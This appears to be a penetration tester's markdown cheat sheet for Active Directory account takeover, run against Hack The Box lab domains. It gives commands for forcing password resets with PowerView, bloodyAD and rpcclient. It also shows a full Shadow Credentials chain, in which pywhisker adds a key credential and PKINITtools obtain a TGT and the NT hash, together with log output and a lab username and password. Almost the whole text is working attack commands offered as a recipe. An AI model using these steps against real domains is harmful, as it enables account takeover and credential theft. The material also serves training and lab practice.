## Creating a PSCredential Object

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

## Changing the User's Password

```powershell
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity USER_TO_CHANGE_PASS -AccountPassword $PASS_OBJECT -Credential $Cred -Verbose
```

### From linux

## Get All users you can write to

```bash
bloodyAD -d HERCULES.HTB -k --dc-ip 10.10.11.91 get writable
```

#### rpc

```bash
rpcclient> setuserinfo UserName 23 password
                                ^
```

## Shadow Credentials

https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204

```bash
py ~/tools/pywhisker.py -u judith.mader -p judith09 -d certified.htb --dc-ip 10.10.11.41 -t management_svc -a add --filename mngmnt_svc --export PEM
```

After that

```bash
py ~/tools/active_directory/PKINITtools/gettgtpkinit.py -cert-pem mngmnt_svc_cert.pem -key-pem mngmnt_svc_priv.pem certified.htb/management_svc management_svc.ccache

ngmnt_svc_priv.pem certified.htb/management_svc management_svc1.ccache
2024-11-06 22:49:05,947 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-11-06 22:49:05,965 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-11-06 22:49:29,976 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-11-06 22:49:29,977 minikerberos INFO     c34a6506882b9090ea6af6d5f294d37d8145575d3981913d24e16827fe1421d5
INFO:minikerberos:c34a6506882b9090ea6af6d5f294d37d8145575d3981913d24e16827fe1421d5
2024-11-06 22:49:29,984 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```

You can now get the nthash from the ticket like

```bash
export KRB5CCNAME=management_svc1.ccache; py ~/tools/active_directory/PKINITtools/getnthash.py -key c34a6506882b9090ea6af6d5f294d37d8145575d3981913d24e16827fe1421d5 certified.htb/management_svc
```
